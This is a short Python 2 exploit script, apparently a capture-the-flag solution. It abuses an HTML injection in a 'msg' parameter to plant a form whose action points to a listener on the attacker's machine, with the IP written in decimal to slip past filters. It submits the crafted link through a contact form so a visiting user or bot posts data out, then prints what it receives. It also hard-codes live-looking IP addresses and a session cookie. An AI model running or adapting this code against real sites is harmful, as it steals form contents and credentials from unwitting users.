import requests
from socket import *

# SOCK SETTING
s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 6354))
s.listen(5)

print "[*] listen socket 0.0.0.0:6354"

external_ip = "128.134.218.238"
dec_ip = int("".join("%02x"%int(x) for x in external_ip.split(".")), 16)

url = "http://34.253.165.46/LocalHope/contact.php"
target_url = "http://34.253.165.46/LocalHope/home.php?msg=</form><form action='http://%d:6354'>" % (dec_ip)

headers = {"Cookie": "PHPSESSID=9ovu5q4ud2cvl9rq9k4k2sqsm1" }
data = { "url":  target_url }


r = requests.post(url, headers=headers, data=data)
print "[*] Sent : {}".format(url)

c, addr = s.accept()
print c.recv(1024)
c.close()
